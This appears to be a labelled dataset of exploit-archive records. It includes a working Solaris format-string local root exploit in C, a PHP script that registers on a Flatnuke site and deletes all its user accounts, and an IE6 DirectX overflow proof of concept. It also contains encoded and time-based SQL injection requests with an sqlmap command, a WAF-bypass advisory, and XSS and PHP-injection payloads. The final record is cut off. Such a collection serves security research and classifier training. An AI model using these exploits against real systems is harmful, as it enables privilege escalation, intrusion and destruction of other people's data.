4251,"Microsoft Internet Explorer 6 - DirectX Media Remote Overflow Denial of Service <!--============================================================================ dxtmsft.dll Remote Buffer Overflow Exploit Internet Explorer ver 6.0 DeltahackingSecurityTEAM Bug discovered by Dr.Pantagon Affected Software: dxtmsft.dll  (DirectX Media -- Image DirectX Transforms) DLL VER : 6.00.2900.2180 (xpsp_sp2_rtm.040803-2158) Company Dll : Microsoft® Windows® Operating System path : C:\WINDOWS\system32\dxtmsft.dll all software that use this ocx are vulnerable to this exploits. www.Deltahacking.net www.Deltasecurity.ir ==============================================================================-->  <object classid=""clsid:421516C1-3CF8-11D2-952A-00C04FA34F05"" id=""Chroma""></object>  <input language=VBScript onclick=jojo() type=button value=""Click here to start Exploit""><script language='vbscript'>  Sub jojo   buff = String(999999, ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaA"")    get_EDX = ""aaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbcccccccccccccddddddddddeee""    buff1 = String(999999, ""BBBBBBBBBBBBBBBBBBBBBBBBBBBBbb"")    egg = buff + get_EDX + buff1 + scode    Chroma.Color = egg  End Sub </script>  # milw0rm.com [2007-07-31]",['DirectX Media'],1
210,"Solaris 2.6/7.0 - 'locale' Format Strings noexec stack Overflow /*  * exploit for locale subsystem format strings bug In Solaris with noexec stack.  * Tested in Solaris 2.6/7.0 (If it wont work, try adjust retloc offset. e.g.   * ./ex -o -4 )  *  * $gcc -o ex ex.c `ldd /usr/bin/passwd|sed -e 's/^.lib\([_0-9a-zA-Z]*\)\.so.*/-l\1/'`  * usages: ./ex -h  *  * Thanks for Ivan Arce <iarce@core-sdi.com> who found this bug.  * Thanks for horizon's great article about defeating noexec stack for Solaris.  *  * THIS CODE IS FOR EDUCATIONAL PURPOSE ONLY AND SHOULD NOT BE RUN IN  * ANY HOST WITHOUT PERMISSION FROM THE SYSTEM ADMINISTRATOR.  *  *     by warning3@nsfocus.com (http://www.nsfocus.com)  *             y2k/11/10  */  #include <stdio.h> #include <unistd.h> #include <sys/systeminfo.h> #include <fcntl.h> #include <dlfcn.h>  #define BUFSIZE 2048			/* the size of format string buffer	*/ #define BUFF    128			/* the progname buffer size		*/ #define SHELL   ""/bin/ksh""		/* shell name				*/ #define DEFAULT_NUM 68			/* format strings number		*/ #define DEFAULT_RETLOC 0xffbefb44	/* default retloc address		*/ #define VULPROG  ""/usr/bin/passwd""	/* vulnerable program name		*/  void usages(char *progname) {   int i;   printf(""Usage: %s \n"", progname);   printf(""    [-h]       Help menu\n"");   printf(""    [-n number]      format string's number\n"");   printf(""    [-a align]       retloc buffer alignment\n"");   printf(""    [-o offset]      retloc offset\n\n"");  }  /* get current stack point address to guess Return address */ long get_sp(void) {   __asm__(""mov %sp,%i0""); }  main( int argc, char **argv ) {   char *pattern, retlocbuf[BUFF], *env[11];   char plat[BUFF], *ptr;   long sh_addr, sp_addr, i;   long retloc = DEFAULT_RETLOC, num = DEFAULT_NUM,  align = 0, offset=0;   long  *addrptr;   long reth, retl, reth1, retl1;   FILE *fp;       extern int optind, opterr;   extern char *optarg;   int opt;    void *handle;   long execl_addr, fp_addr, fp1_addr;   char fakeframe[512];   char padding[64], pad = 0;   int env_len, arg_len, len;    char progname[BUFF];   strncpy(progname, argv[0], BUFF-1);    while ((opt = getopt(argc, argv, ""n:a:o:h"")) != -1)     switch((char)opt)     {        case 'n':         num = atoi(optarg);         break;        case 'a':         align = atoi(optarg);         break;       case 'o':         offset = atoi(optarg);         break;       case '?':       case 'h':       default:         usages(progname);         exit(0);     }    retloc +=  offset;      /* get platform info  */   sysinfo(SI_PLATFORM,plat,256);    /* Construct fake frame in environ */      env[0] = ""NLSPATH=:."";   env[1] = padding;      /* padding so that fakeframe's address can be divided by 4 */   /* sh_addr|sh_addr|0x00000000|fp2|fp2|fp2|fp2|fp2|0x00|/bin/ksh|0x00 */   env[2]=(fakeframe);     /* sh_addr|sh_addr|0x00           */   env[3]=&(fakeframe[40]);/*         |0x00      */   env[4]=&(fakeframe[40]);/*        |0x00       */   env[5]=&(fakeframe[40]);/*             |0x00  */   env[6]=&(fakeframe[44]);/*            |fp2|fp2|fp2|fp2|fp2*/   env[7]=SHELL;     /* shell strings */   env[8]=NULL;    /* calculate the length of ""VULPROG"" + argv[1] */   arg_len = strlen(VULPROG) + strlen(""-z"") + 2;    /* calculate the pad nummber .    * We manage to let the length of padding + arg_len + ""NLSPATH=."" can    * be divided by 4. So fakeframe address is aligned with 4, otherwise    * the exploit won't work.    */   pad = 3 - (arg_len + strlen(env[0]) +1)%4;   memset(padding, 'A', pad);   padding[pad] = '\0';    /* get environ length */   env_len = 0;    for(i = 0 ; i < 8 ; i++ )     env_len += strlen(env[i]) + 1;   /* get the length from argv[0] to stack bottom    *                     * +------------------------+-----------+--------+-----------+--------+   * |argv[0]argv[1]...argv[n]|env0...envn|platform|programname|00000000|   * +------------------------+-----------+--------+-----------+--------+   * ^               ^    * |__startaddr                |__sp_addr    *   * ""sp_addr"" = 0xffbefffc(Solaris 7/8) or 0xeffffffc(Solaris 2.6)   *   *  I find ""startaddr"" always can be divided by 4.   *  So we can adjust the padding's size to let the fakeframe address   *  can be aligned with 4.   *   * len = length of ""argv"" + ""env"" + ""platform"" + ""program name""    * if (len%4)!=0, sp_addr - startaddr =  (len/4)*4 + 4   * if (len%4)==0, sp_addr - startaddr =  len   * So we can get every entry's address precisely based on startaddr or sp_addr.   * Now we won't be bored with guessing the alignment and offset.:)   */   len = arg_len + env_len + strlen(plat) + 1    + strlen(VULPROG) + 1;   printf(""len = %#x\n"", len);    /* get stack bottom address */    sp_addr = (get_sp() | 0xffff) & 0xfffffffc;    /* fp1_addr must be valid stack address */   fp1_addr = (sp_addr & 0xfffffac0);    /* get shell string address */   sh_addr =  sp_addr - (4 - len%4) /* the trailing zero number */          - strlen(VULPROG) - strlen(plat)  - strlen(SHELL) - 3 ;     printf(""SHELL address = %#x\n"", sh_addr);       /* get our fake frame address */   fp_addr = sh_addr - 8*8 - 1;    /* get execl() address */   if (!(handle=dlopen(NULL,RTLD_LAZY)))   {                 fprintf(stderr,""Can't dlopen myself.\n"");     exit(1);   }   if ((execl_addr=(long)dlsym(handle,""execl""))==NULL)   {     fprintf(stderr,""Can't find execl().\n"");     exit(1);   }                   /* dec 4 to skip the 'save' instructure */   execl_addr -= 4;      /* check if the exec addr includes zero  */   if (!(execl_addr & 0xff) || !(execl_addr * 0xff00) ||     !(execl_addr & 0xff0000) || !(execl_addr & 0xff000000))   {     fprintf(stderr,""the address of execl() contains a '0'. sorry.\n"");     exit(1);   }    printf(""Using execl() address : %#x\n"",execl_addr);    /* now we set up our fake stack frame */    addrptr=(long *)fakeframe;    *addrptr++= 0x12345678; /* you can put any data in  local registers */   *addrptr++= 0x12345678;   *addrptr++= 0x12345678;   *addrptr++= 0x12345678;   *addrptr++= 0x12345678;   *addrptr++= 0x12345678;   *addrptr++= 0x12345678;   *addrptr++= 0x12345678;    *addrptr++=sh_addr;      /* points to our string to exec */   *addrptr++=sh_addr;      /* argv[1] is a copy of argv[0] */   *addrptr++=0x0;    /* NULL for execl();  &fakeframe[40] */   *addrptr++=fp1_addr;     /* &fakeframe[44] */   *addrptr++=fp1_addr;   *addrptr++=fp1_addr;   *addrptr++=fp1_addr;     /* we need this address to work  */   *addrptr++=fp1_addr; /* cause we don't need exec another func,so put garbage here */   *addrptr++=0x0;    /* get correct retloc in solaris 2.6(0xefffxxxx) and solaris 7/8 (0xffbexxxx) */   retloc = (get_sp()&0xffff0000) + (retloc & 0x0000ffff);    printf(""Using RETloc address = 0x%x,  fp_addr = 0x%x  ,align= %d\n"", retloc, fp_addr, align );    /* Let's make reloc buffer: |AAAA|retloc-4|AAAA|retloc-2|AAAA|retloc|AAAA|retloc+2|*/    addrptr = (long *)retlocbuf;    for( i = 0 ; i < 8 ; i ++ )     *(addrptr + i) = 0x41414141;     *(addrptr + 1) = retloc - 4;     *(addrptr + 3) = retloc - 2;     *(addrptr + 5) = retloc ;     *(addrptr + 7) = retloc + 2;    if((pattern = (char *)malloc(BUFSIZE)) == NULL) {     printf(""Can't get enough memory!\n"");     exit(-1);   }    /* Let's make formats string buffer:     * |A..AAAAAAAAAAAA|%.8x....|%(fp1)c%hn%(fp2)%hn%(execl1)c%hn%(execl2)%hn|      */   ptr = pattern;   memset(ptr, 'A', 32);   ptr += 32;    for(i = 0 ; i < num ; i++ ){     memcpy(ptr, ""%.8x"", 4);     ptr += 4;   }    reth = (fp_addr >> 16) & 0xffff ;   retl = (fp_addr >>  0) & 0xffff ;   reth1 = (execl_addr >> 16) & 0xffff ;   retl1 = (execl_addr >>  0) & 0xffff ;       /* Big endian arch */   sprintf(ptr, ""%%%uc%%hn%%%uc%%hn%%%uc%%hn%%%uc%%hn"",          (reth - num*8 -4*8 + align ), (0x10000 +  retl - reth),          (0x20000 + reth1 - retl), (0x30000 + retl1 - reth1));    if( !(fp = fopen(""messages.po"", ""w+"")))   {     perror(""fopen"");     exit(1);   }   fprintf(fp,""domain \""messages\""\n"");   fprintf(fp,""msgid  \""%%s: illegal option -- %%c\\n\""\n"");   fprintf(fp,""msgstr \""%s\\n\"""", pattern + align);   fclose(fp);   system(""/usr/bin/msgfmt -o SUNW_OST_OSLIB messages.po"");    /* thanks for z33d's idea.     * It seems we have to do like this in Solaris 8.    */   i=open(""./SUNW_OST_OSLIB"",O_RDWR);   /* locate the start position of formats strings in binary file*/   lseek(i, 62, SEEK_SET);   /* replace the start bytes with our retlocbuf */   write(i, retlocbuf + align, 32 - align);   close(i);    execle(VULPROG, VULPROG, ""-z"", NULL, env); }   // milw0rm.com [2000-11-30]","[""'locale'""]",1
8930,"ModSecurity 2.5.9 (Core Rules 2.5-1.6.1) - Filter Bypass   ========================================================================   ModSecurity (Core Rules) HPP Filter Bypass Vulnerability   ========================================================================    Affected Software : ModSecurity <= 2.5.9 using ModSecurity Core Rules <= 2.5-1.6.1   Author                 : Lavakumar Kuppan - lavakumar[dot]in[at]gmail[dot]com   Advisory URL       : http://www.lavakumar.com   Severity               : High   Local/Remote       : Remote    [Vulnerability Details]    Modsecurity is an Open source Web Application firewall which runs as an Apache   module. It has a comprehensive set of rules called 'ModSecurity Core Rules' for common web application   attacks like SQL Injection, Cross-Site Scripting etc.    It is possible to bypass the ModSecurity Core Rules due to the difference in behaviour   of ModSecurity and ASP/ASP.NET applications in handling duplicate HTTP GET/POST/Cookie   parameters. Using duplicate parameters has been termed as HTTP Parameter Pollution by Luca Carettoni   and Stefano Di Paola.    When multiple GET/POST/Cookie parameters of the same name are passed in the HTTP request   to ASP and ASP.NET applications they are treated as an array collection.   This leads to the values being concatenated with a comma inbetween them.    For example when the following query is sent to the server:   -----------------------------   POST /index.aspx?a=1&a=2   Host: www.example.com   Cookie: a=5; a=6   Content-Length: 7    a=3&a=4   -----------------------------    The server side interpretation of this data is as follows:    Request.Params[""a""]        --> ""1,2,3,4,5,6"" ( if ""a"" was registered as a server-side control ) (ASP.NET Only)   Request.Params[""a""]        --> ""1,2,5,6"" ( if ""a"" was not registered as a server-side control ) (ASP.NET Only)   Request.QueryString[""a""] --> ""1,2"" (ASP and ASP.NET)   Request.Form[""a""]       --> ""3,4"" (ASP and ASP.NET)    This behaviour is unique to ASP and ASP.NET applications and ModSecurity does not interpret this data in the   same way. When dealt with multiple parameters of the same name ModSecurity matches the value of each instance   of the parameter seperately against its rule base. Incase of the above example ModSecurity would run '1' against   the rule set first then '2' and so on till '6'.    Since data is interpreted differently by the Web Application and the Firewall this produces intresting possibilities   for a filter bypass scenario.    This theory was tested against the SQL Injection rule base of ModSecurity Core Rules and was found to bypass the   default-enabled rule set successfully.    The following request is blocked by ModSecurity as this matches its Generic SQL Injection Attack rule.     http://example.com/search.aspx?value=select 1,2,3 from table    ModSecurity Interpretation:    value = select 1,2,3 from table   Web Application Interpretation:    value = select 1,2,3 from table    However the same payload can be sent to the server by splitting it using duplicate parameters like below.     http://example.com/search.aspx?value=select 1&value=2,3 from table    ModSecurity Interpretation:    value = select 1    value = 2,3 from table   Web Application Interpretation:    value select 1,2,3 from table    The attack can be made more flexible by using the inline comment feature in MS SQL servers.     http://example.com/search.aspx?value=select/*&value=*/1,2,3/*&value=*/from/*&value=*/table    ModSecurity Interpretation:    value=select/*    value=*/1,2,3/*    value=*/from/*    value=*/table   Web Application Interpretation:    value = select/*,*/1,2,3/*,*/from/*,*/table    This technique could possibly be extended to exploit other types of Web Application vulnerabilities as well.    Refer the whitepaper 'Split and Join' (see references) for more details on this attack.    [Fix Information]     N/A    [References]    http://www.lavakumar.com/Split_and_Join.pdf   http://www.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf    [Legal Notices]    The information in the advisory is believed to be accurate at the   time of publishing based on currently available information.   This information is provided as-is, as a free service to the community.   There are no warranties with regard to this information.   The author does not accept any liability for any direct,   indirect, or consequential loss or damage arising from use of,   or reliance on, this information.   Permission is hereby granted for the redistribution of this alert,   provided that the content is not altered in any way, except   reformatting, and that due credit is given.    This vulnerability has been disclosed in accordance with the RFP   Full-Disclosure Policy v2.0, available at:   http://www.wiretrip.net/rfp/policy.html  # milw0rm.com [2009-06-11]",['index.aspx?'],1
2499,"Flatnuke 2.5.8 - 'userlang' Local Inclusion / Delete All Users #!/usr/bin/php -q -d short_open_tag=on <? print_r(' ----------------------------------------------------------------------------- Flatnuke 2.5.8 ""userlang"" arbitrary local inclusion/delete all users exploit by rgod rgod@autistici.org site: http://retrogod.altervista.org dork: ""FlatNuke"" ""Valid HTML 4.01!"" ""Valid CSS!"" ""Get RSS 2.0 Feed"" ""Get RSS       2.0 Feed"" inurl:/forum/ +AND +OR ----------------------------------------------------------------------------- '); /* works regardless of php.ini settings  if ($argc<3) { print_r(' ----------------------------------------------------------------------------- Usage: php '.$argv[0].' host path OPTIONS host:      target server (ip/hostname) path:      path to flatnuke Options:  -p[port]:    specify a port other than 80  -P[ip:port]: specify a proxy Example: php '.$argv[0].' 2.2.2.2 /flatnuke/-P1.1.1.1:80 php '.$argv[0].' 1.1.1.1 /-p81 ----------------------------------------------------------------------------- '); die; }  error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",5);  function quick_dump($string) {   $result='';$exa='';$cont=0;   for ($i=0; $i<=strlen($string)-1; $i++)   {    if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))    {$result.=""  ."";}    else    {$result.=""  "".$string[$i];}    if (strlen(dechex(ord($string[$i])))==2)    {$exa.="" "".dechex(ord($string[$i]));}    else    {$exa.="" 0"".dechex(ord($string[$i]));}    $cont++;if ($cont==15) {$cont=0; $result.=""\r\n""; $exa.=""\r\n"";}   }  return $exa.""\r\n"".$result; } $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; function sendpacketii($packet) {   global $proxy, $host, $port, $html, $proxy_regex;   if ($proxy=='') {     $ock=fsockopen(gethostbyname($host),$port);     if (!$ock) {       echo 'No response from '.$host.':'.$port; die;     }   }   else { 	$c = preg_match($proxy_regex,$proxy);     if (!$c) {       echo 'Not a valid proxy...';die;     }     $parts=explode(':',$proxy);     echo ""Connecting to "".$parts[0]."":"".$parts[1]."" proxy...\r\n"";     $ock=fsockopen($parts[0],$parts[1]);     if (!$ock) {       echo 'No response from proxy...';die; 	}   }   fputs($ock,$packet);   if ($proxy=='') {     $html='';     while (!feof($ock)) {       $html.=fgets($ock);     }   }   else {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {       $html.=fread($ock,1);     }   }   fclose($ock);   #debug   #echo ""\r\n"".$html; } function make_seed() {    list($usec, $sec) = explode(' ', microtime());    return (float) $sec + ((float) $usec * 100000); }  $host=$argv[1]; $path=$argv[2]; $port=80; $proxy=""""; for ($i=3; $i<$argc; $i++){ $temp=$argv[$i][0].$argv[$i][1]; if ($temp==""-p"") {   $port=str_replace(""-p"","""",$argv[$i]); } if ($temp==""-P"") {   $proxy=str_replace(""-P"","""",$argv[$i]); } } if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}  //check for fd+.php existence, be sure this is 2.5.8 $packet =""GET "".$p.""download/fd+.php HTTP/1.0\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpacketii($packet); $temp=explode(""\n"",$html); if (eregi(""404 Not Found"",$temp[0])) {die(""wrong Flatnuke version..."");}  srand(make_seed()); $v = rand(1,9999); $username=""suntzoi"".$v;  //register $data=""op=reg&nome="".$username; $data.=""&regpass=suntzu""; $data.=""&reregpass=suntzu""; $data.=""&anag=suntzu""; $data.=""&email=suntzu@fake.fke""; $data.=""&homep="".urlencode('http://www.asite.com'); $data.=""&prof=PUNK""; $data.=""&prov=whereimfrom""; $data.=""&ava=clanbomber.png""; $data.=""&url_avatar=""; $data.=""&firma=""; $packet=""POST "".$p.""forum/index.php HTTP/1.1\r\n""; $packet.=""Accept-Encoding: text/plain\r\n""; $packet.=""Content-Type: application/x-www-form-urlencoded\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Content-Length: "".strlen($data).""\r\n""; $packet.=""Connection: Close\r\n\r\n""; $packet.=$data; sendpacketii($packet); echo $username.""\r\n"";  //Login... (to see memberlist) $data=""op=login&nome="".$username.""&logpassword=suntzu""; $packet=""POST "".$p.""forum/index.php HTTP/1.1\r\n""; $packet.=""Content-Type: application/x-www-form-urlencoded\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Content-Length: "".strlen($data).""\r\n""; $packet.=""Connection: Close\r\n\r\n""; $packet.=$data; sendpacketii($packet); $temp=explode(""Set-Cookie: "",$html); $temp2=explode(' ',$temp[1]); $cookie=$temp2[0]; $temp2=explode(' ',$temp[2]); $cookie.="" "".$temp2[0]; echo ""cookie -> "".$cookie.""\r\n"";  //Retrieve usernames... $users=array(); $i=0; do { $i++; $f=false; $packet=""GET "".$p.""forum/index.php?op=members&page="".$i."" HTTP/1.1\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Cookie: "".$cookie.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpacketii($packet); $temp=explode(""index.php?op=profile&user="",$html); for ($kk=1; $kk<count($temp); $kk++) { $temp[$kk]=str_replace(""\"""","""",$temp[$kk]); $temp2=explode("">"",$temp[$kk]); if (($temp2[0]<>"""") and ($temp2[0]<>$username)){$f=true;} if ($temp2[0]<>"""") { if (!in_array($temp2[0],$users)) { $users=array_merge($users,trim($temp2[0])); } } } } while ($f==true);  //delete all users... for ($i=0; $i<count($users); $i++) { echo ""deleting -> "".$users[$i].""\r\n""; $data='-----------------------------7d626f251b00fa Content-Disposition: form-data; name=""canc"";  1 -----------------------------7d626f251b00fa Content-Disposition: form-data; name=""file_da_canc"";  ../../forum/users/'.$users[$i].'.php -----------------------------7d626f251b00fa-- '; $packet =""POST "".$p.""index.php?mod=Download HTTP/1.0\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Content-Type: multipart/form-data; boundary=---------------------------7d626f251b00fa\r\n""; $packet.=""Content-Length: "".strlen($data).""\r\n""; $packet.=""Accept: text/plain\r\n""; $packet.=""Cookie: userlang=../sections/none_Sondaggio/Vecchi_sondaggi/section;\r\n""; $packet.=""Connection: Close\r\n\r\n""; $packet.=$data; sendpacketii($packet); } ?>  # milw0rm.com [2006-10-10]","[""'userlang'""]",1
46210,"Reservic 1.0 - 'id' SQL Injection # Exploit Title: Reservic - Reserves Management System 1.0 - SQL Injection # Dork: N/A # Date: 2019-01-20 # Exploit Author: Ihsan Sencan # Vendor Homepage: http://ragob.com/ # Software Link: https://codecanyon.net/item/reservic-reserves-management-system/11736786 # Version: 1.0 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A  # POC:  # 1) # http://localhost/[PATH]/index.php/framework-crud-detailaction?crud=reserves&id=[SQL]&backTo=dashboard #   GET /[PATH]/index.php/framework-crud-detailaction?crud=reserves&id=4+%41%4e%44%28%53%45%4c%45%43%54%20%31+%46%52%4f%4d%20%28%53%45%4c%45%43%54%20%43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41%54%28%28%53%45%4c%45%43%54%28%53%45%4c%45%43%54%20%43%4f%4e%43%41%54%28%43%41%53%54%28%44%41%54%41%42%41%53%45%28%29+%41%53%20%43%48%41%52%29%2c%30%78%37%65%2c%30%78%34%39%36%38%37%33%36%31%36%65%35%33%36%35%36%65%36%33%36%31%36%65%29%29%20%46%52%4f%4d%20%49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%54%41%42%4c%45%53%20%57%48%45%52%45%20%74%61%62%6c%65%5f%73%63%68%65%6d%61%3d%44%41%54%41%42%41%53%45%28%29%20%4c%49%4d%49%54%20%30%2c%31%29%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78%20%46%52%4f%4d%20%49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%54%41%42%4c%45%53%20%47%52%4f%55%50%20%42%59%20%78%29%61%29&backTo=dashboard HTTP/1.1 Host: TARGET User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=9832af9c6649b4b918850c9c898e05dc DNT: 1 Connection: keep-alive Upgrade-Insecure-Requests: 1 HTTP/1.1 200 OK Date: Sun, 20 Jan 2019 13:01:16 GMT Server: Apache/2.4.10 (Debian) X-Powered-By: PHP/7.0.28 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Vary: Accept-Encoding Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html; charset=UTF-8 Transfer-Encoding: chunked","[""'id'""]",1
4790,"RunCMS 1.6 - Multiple Vulnerabilities Digital Security Research Group Advisory   Application:                    RunCMS Versions Affected:              RunCMS 1.6 Vendor URL:                     http://www.runcms.org Bugs:                           SQL Injections, XSS, PHP Include, Predictable session id, etc. Exploits:                       Aviable Reported:                       14.12.2007 Vendor response:                15.12.2007 Date of Public Advisory:        25.12.2007 Authors:                        Alexandr Polyakov, Stas Svistunovich                                 Digital Security Research Group (research@dsec.ru) OSVDB:                          41231, 41241, 41242, 41243, 42145, 41246, 41248, 41249, 41250, 41251   Description ***********  RunCMS system has multiple security vulnerabilities:  1. Blind SQL Injection 2. Stored XSS 3. Linked XSS 4. Image XSS 5. Predictable session id 6. Vulnerable password changing algorithm 7. Many PHP Injections in Administrator panel   Details *******   1. Multiple Blind SQL Injection  Attacker can inject SQL code in modules:          http://[server]/[installdir]/modules/mydownloads/brokenfile.php?lid+DSecRG_INJECTION         http://[server]/[installdir]/modules/mydownloads/visit.php?lid=2+DSecRG_INJECTION         http://[server]/[installdir]/modules/mydownloads/ratefile.php?lid=2+DSecRG_INJECTION         http://[server]/[installdir]/modules/mylinks/ratelink.php?lid=2+DSecRG_INJECTION         http://[server]/[installdir]/modules/mylinks/modlink.php?lid=2+DSecRG_INJECTION         http://[server]/[installdir]/modules/mylinks/brokenlink.php?lid=2+DSecRG_INJECTION  Example:  This query will return link to download file:         GET http://[server]/[installdir]/modules/mydownloads/brokenfile.php?lid=1+and+1=1 HTTP/1.0   This query will return error:         GET http://[server]/[installdir]/modules/mydownloads/brokenfile.php?lid=1+and+1=0 HTTP/1.0  --------------------------------------------------------------------------------------------   2. Stored XSS  Vulnerability found in script modules/news/submit.php in post parameter name ""subject""   Example:          POST http://[server]/[installdir]/modules/news/submit.php HTTP/1.0           subject=<script>alert(""DSecRG_XSS"")</script>  --------------------------------------------------------------------------------------------   3. Linked XSS vulnerability found in modules/news/index.php, attacker can inject XSS in URL string:  Example:          http://[server]/[installdir]/modules/news/index.php/""><script>alert('DSecRG_XSS')</script>  --------------------------------------------------------------------------------------------   4. Image XSS vulnerability in page edituser.php, attacker can upload avatar picture with XSS code:   Example:          More info: http://www.dsec.ru/about/articles/web_xss/ (in Russian)  --------------------------------------------------------------------------------------------   5. Predictable session id  Session id generator uses a predictable function, so id can be changed manually.  --------------------------------------------------------------------------------------------  6. Password changing vulnerability  Previous password not required to set a new password.  --------------------------------------------------------------------------------------------   7. Administrator page PHP Injection  Administrator can inject PHP code and execute OS commands with webserver user privileges.  page: /modules/system/admin.php?fct=meta-generator         parameter name=""header""         parameter name=""footer""  page: /modules/system/admin.php?fct=disclaimer         parameter name=""disclaimer""  page: /modules/mydownloads/admin/index.php?op=mydownloadsConfigAdmin         parameter name='disclaimer'  page: /modules/newbb_plus/admin/forum_config.php         parameter name=""disclaimer""  page: /modules/mylinks/admin/index.php?op=myLinksConfigAdmin         parameter name=""disclaimer""  page: /modules/sections/admin/index.php?op=secconfig         parameter name='intro'   Example:          POST /modules/system/admin.php?fct=disclaimer HTTP/1.0         Host=localhost         User-Agent=Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.7) Gecko/20070914 Firefox/2.0.0.7         Keep-Alive=300         Proxy-Connection=keep-alive         Content-Type=application/x-www-form-urlencoded         Content-Length=226         POSTDATA=perpage=10&popular=100&newlinks=10&useshots=0&shotwidth=140&anon_add=0&rss_enable=1&rss_maxitems=5&rss_maxdescription=200&         disclaimer=<?phpinfo();?>&op=myLinksConfigChange   This page can be overwritten by PHP injection:          runcms_1.6\modules\sections\cache\intro.php         runcms_1.6\modules\mylinks\cache\disclaimer.php         runcms_1.6\modules\mydownloads\cache\disclaimer.php         runcms_1.6\modules\newbb_plus\cache\disclaimer.php         runcms_1.6\modules\system\cache\disclaimer.php         runcms_1.6\modules\system\cache\footer.php         runcms_1.6\modules\system\cache\header.php         runcms_1.6\modules\system\cache\maintenance.php    Fix Information ***************  RunCMS was altered to fix this flaw on Dec 15, 2007. Updated version (1.6.1) can be downloaded here:         http://www.runcms.org/modules/mydownloads/visit.php?lid=131    About *****  Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.   Contact:        research@dsec.ru                 http://www.dsec.ru (in Russian)  # milw0rm.com [2007-12-25]","['submit.php ', 'index.php,']",1
44943,"WordPress Plugin iThemes Security < 7.0.3 - SQL Injection # Exploit Title: WordPress Plugin iThemes Security(better-wp-security) <= 7.0.2 - Authenticated SQL Injection # Date: 2018-06-25 # Exploit Author: Çlirim Emini  # Website: https://www.sentry.co.com/ # Vendor Homepage: https://ithemes.com/ # Software Link: https://wordpress.org/plugins/better-wp-security/ # Version/s: 7.0.2 and below # Patched Version: 7.0.3 # CVE : 2018-12636 # WPVULNDB: https://wpvulndb.com/vulnerabilities/9099  Plugin description:  iThemes Security works to lock down WordPress, fix common holes, stop automated attacks and strengthen user credentials. With advanced features for experienced users, this WordPress security plugin can help harden WordPress.  Description:  WordPress Plugin iThemes Security(better-wp-security) before 7.0.3 allows remote authenticated users to execute arbitrary SQL commands via the 'orderby' parameter in the 'itsec-logs' page to wp-admin/admin.php.  Technical details:  Parameter orderby is vulnerable because backend variable $sort_by_column is not escaped.  File: better-wp-security/core/admin-pages/logs-list-table.php Line 271: if ( isset( $_GET[' orderby '], $_GET['order'] ) ) { Line 272: $ sort_by_column = $_GET[' orderby '];  File: better-wp-security/core/lib/log-util.php Line 168: $query .= ' ORDER BY ' . implode( ', ', $ sort_by_column ));  Proof of Concept (PoC):  The following GET request will cause the SQL query to execute and sleep for 10 seconds if clicked on as an authenticated admin:  http://localhost/wp-admin/admin.php?page=itsec-logs&filter=malware&orderby=remote_ip%2c(select*from(select(sleep(10)))a)&order=asc&paged=0  Using SQLMAP:  sqlmap -u 'http://localhost/wp-admin/admin.php?page=itsec-logs&filter=malware&orderby=remote_ip*&order=asc&paged=0' --cookie ""wordpress_b...; wordpress_logged_in_bbf...;"" --string ""WordPress"" --dbms=MySQL --technique T --level 5 --risk 3",['admin.php.'],1
24913,"Network Weathermap 0.97a - 'editor.php' Persistent Cross-Site Scripting Network Weathermap 0.97a - Persistent XSS Earlier versions are also possibly vulnerable.  INFORMATION  Product: Network Weathermap 0.97a Remote-exploit: yes Vendor-URL: http://www.network-weathermap.com/  Discovered by: Daniel Ricardo dos Santos CVE Request - 15/03/2013 CVE Assign - 18/03/2013 CVE Number - CVE-2013-2618 Vendor notification - 18/03/2013 Vendor reply - No reply Public disclosure - 01/04/2013  OVERVIEW  Network Weathermap 0.97a is vulnerable to a persistent XSS when displaying available files.  INTRODUCTION  Network Weathermap is a network visualisation tool, to take data you already have and show you an overview of your network in map form. Support is built in for RRD, MRTG (RRD and old log-format), and tab-delimited text files. Other sources are via plugins or external scripts.  VULNERABILITY DESCRIPTION  The vulnerability happens when a user injects HTML and Javascript into the title of a map in editor.php. This title is later shown to the user when listing the files in editor.php?action=newfile  Besides the title, other fields also allow an attacker to upload malicious PHP code to a webserver, which can later be executed if the attacker has direct acess to that file.  This application is often used as a plugin for Cacti. The vulnerability can be exploited in this mode as well, in weathermap-cacti-plugin-mgmt.php?action=viewconfig&file=<affected_file> and it can be used to exploit Cacti.  To test it, simply create a map or edit an existing one: GET editor.php?mapname=test&action=newmap  Then edit the map title with the payload: POST editor.php 